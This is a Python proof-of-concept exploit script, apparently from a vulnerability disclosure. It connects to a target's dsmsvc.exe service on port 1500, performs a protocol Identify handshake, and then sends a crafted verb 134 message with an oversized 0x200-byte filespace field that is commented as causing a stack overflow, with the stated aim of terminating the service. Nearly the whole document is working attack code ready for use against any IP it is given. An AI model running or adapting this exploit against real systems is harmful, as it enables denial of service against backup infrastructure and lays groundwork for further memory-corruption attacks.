import argparse, struct, socket, string

# Got it from the Internet 
def hexdump(src, length=16):
  DISPLAY = string.digits + string.letters + string.punctuation
  FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
  lines = []
  for c in xrange(0, len(src), length):
    chars = src[c:c+length]
    hex = ' '.join(["%02x" % ord(x) for x in chars])
    if len(hex) > 24:
      hex = "%s %s" % (hex[:24], hex[24:])
    printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
    lines.append("%08x:  %-*s  %s\n" % (c, length*3, hex, printable))
  return ''.join(lines)

def dump(title, data):
  print '---[ %s ]--- ' % (title)
  print hexdump(data) 

def create_verb(type, data):
  dlen = len(data)
  if type < 0x100:
    header = struct.pack('>HBB', dlen + 4, type, 0xA5)
  else:
    header = struct.pack('>HBBLL', 0, 8, 0xA5, type, dlen + 12)
  
  return header + data 


#
# MAIN
#
desc = 'This PoC attempts to terminate dsmsvc.exe.'

arg_parser = argparse.ArgumentParser(desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-p', type=int, default=1500, help='dsmsvc.exe port, default: 1500')

args = arg_parser.parse_args()
host = args.t
port = args.p

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print 'Sending verb Identify...'
req = create_verb(0x1D, '')
dump('Identify', req)
s.send(req)

res = s.recv(0x100)
(verbLen, verbType, magic) = struct.unpack_from('>HBB', res) 
if verbType != 0x1E or magic != 0xA5:
  print 'Received verb not IdentifyResp'
  s.close()
dump('IdentifyResp', res)

print 'Sending verb 134...'
filespace = 'A' * 0x200       # cause stack overflow
data  = struct.pack('>H', 0)  # filespace offset; offset 0 is data+0x1A 
data += struct.pack('>H', len(filespace)) # filespace length
data += struct.pack('B', 4)   # must be 4 
data += '\x00' * (0x1A - len(data))
data += filespace
req = create_verb(134, data)
dump('Verb 134', req)
s.send(req)
print 'Please check if dsmsvc.exe has terminated.'